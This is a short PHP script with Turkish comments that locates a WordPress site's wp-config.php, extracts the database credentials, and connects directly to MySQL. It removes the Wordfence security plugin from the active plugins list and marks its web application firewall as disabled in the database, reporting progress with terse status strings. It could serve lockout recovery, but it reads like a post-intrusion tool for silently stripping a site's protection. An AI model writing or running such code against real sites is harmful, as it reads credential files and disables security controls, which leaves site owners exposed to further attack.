<?php
// Yolu kendi bul (wp-load.php/wp-config.php'yi yukarı doğru ara)
$dir = __DIR__; $root = false;
while (is_dir($dir)) {
    if (is_file($dir . '/wp-config.php')) { $root = $dir; break; }
    $p = dirname($dir);
    if ($p === $dir) break;
    $dir = $p;
}
if (!$root) die('NO_ROOT');

// wp-config.php'den DB bilgilerini çek (WordPress yüklemeden)
$cfg = file_get_contents($root . '/wp-config.php');
preg_match_all("/define\(\s*'DB_(\w+)'\s*,\s*'([^']*)'\s*\)/", $cfg, $m);
$db = array_combine($m[1], $m[2]);
preg_match("/\\$table_prefix\s*=\s*'([^']*)'/", $cfg, $tp);
$prefix = isset($tp[1]) ? $tp[1] : 'wp_';

$mysqli = @new mysqli($db['HOST'] ?? 'localhost', $db['USER'] ?? '', $db['PASSWORD'] ?? '', $db['NAME'] ?? '');
if ($mysqli->connect_errno) die('DB_FAIL: ' . $mysqli->connect_error);

// 1) active_plugins'ten wordfence'i çıkar -> plugin ölür, waf.php yeniden üretilemez
$res = $mysqli->query("SELECT option_value FROM {$prefix}options WHERE option_name='active_plugins'");
if ($res && $row = $res->fetch_row()) {
    $arr = unserialize($row[0]);
    $n = count($arr);
    $arr = array_values(array_filter($arr, function($p){ return stripos($p, 'wordfence') !== 0; }));
    $stmt = $mysqli->prepare("UPDATE {$prefix}options SET option_value=? WHERE option_name='active_plugins'");
    $s = serialize($arr);
    $stmt->bind_param('s', $s);
    $stmt->execute();
    echo 'PLUGINS_REMOVED:' . ($n - count($arr)) . "\n";
} else {
    echo "NO_ACTIVE_PLUGINS\n";
}

// 2) DB'deki WAF config'ini de devre dışı bırak (wafStatus + wafDisabled)
$tbl = $prefix . 'wfconfig';
$res = $mysqli->query("SHOW TABLES LIKE '$tbl'");
if ($res && $res->num_rows) {
    $mysqli->query("UPDATE $tbl SET val='s:8:\"disabled\";' WHERE name='wafStatus'");
    $mysqli->query("UPDATE $tbl SET val='b:1;' WHERE name='wafDisabled'");
    echo "WAF_DB_DISABLED\n";
}
echo 'DONE';
